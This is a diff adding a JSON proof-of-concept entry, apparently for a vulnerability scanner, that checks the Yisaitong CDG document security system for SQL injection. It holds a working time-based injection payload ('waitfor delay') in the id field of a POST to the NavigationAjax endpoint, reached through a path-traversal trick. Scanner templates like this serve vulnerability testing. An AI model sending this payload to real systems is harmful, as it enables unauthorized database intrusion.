@@ -1,0 +1,15 @@
+{
+	"name":"亿赛通电子文档安全管理系统NavigationAjax接口SQL注入",
+	"tag":"yisaitong",
+	"type":"other",
+	"poc":{
+		"pocGet":"/CDGServer3/js/../NavigationAjax",
+		"pocPost":"command=nav&id=-999'waitfor delay '0:0:3'--+&name=&openId=",
+		"header":{
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
+			"Content-Type":" application/x-www-form-urlencoded"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	}
+}
